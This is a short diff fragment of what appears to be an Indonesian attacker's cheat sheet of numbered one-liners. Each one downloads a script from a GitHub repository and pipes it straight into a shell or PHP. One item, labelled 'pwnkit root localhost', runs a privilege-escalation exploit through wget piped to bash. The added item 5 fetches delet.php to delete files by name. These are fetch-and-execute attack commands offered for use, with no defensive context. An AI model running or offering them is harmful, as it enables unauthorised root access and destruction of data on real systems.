@@ -13,3 +13,7 @@ curl -s https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/outs
 4, pwnkit root localhost
 
 wget https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/pwk.sh -q -O - |bash
+
+5, Mendelet berdasarkan nama file kon7l
+
+curl -s https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/delet.php | php namafile.php
